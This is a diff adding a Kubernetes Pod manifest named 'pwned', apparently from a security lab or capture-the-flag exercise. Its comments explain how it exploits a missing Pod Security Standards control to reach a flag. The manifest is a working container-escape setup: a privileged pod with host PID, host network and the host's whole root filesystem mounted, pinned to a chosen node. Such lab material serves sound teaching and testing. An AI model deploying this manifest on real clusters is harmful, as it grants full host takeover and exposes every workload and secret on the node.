@@ -1,0 +1,30 @@
+# Attacker privileged pod  (exploits Vulnerability 3: no Pod Security Standards)
+#
+# What makes this dangerous:
+#   privileged: true   -> disables ALL container isolation
+#   hostPID: true      -> pod can see all host processes
+#   hostNetwork: true  -> pod shares the host's network
+#   hostPath: /  at /host -> entire host filesystem accessible
+#   nodeName: worker   -> forces the pod onto VM2 where the flag is
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwned
+  namespace: vuln-app
+spec:
+  nodeName: worker
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: pwned
+    image: nginx
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
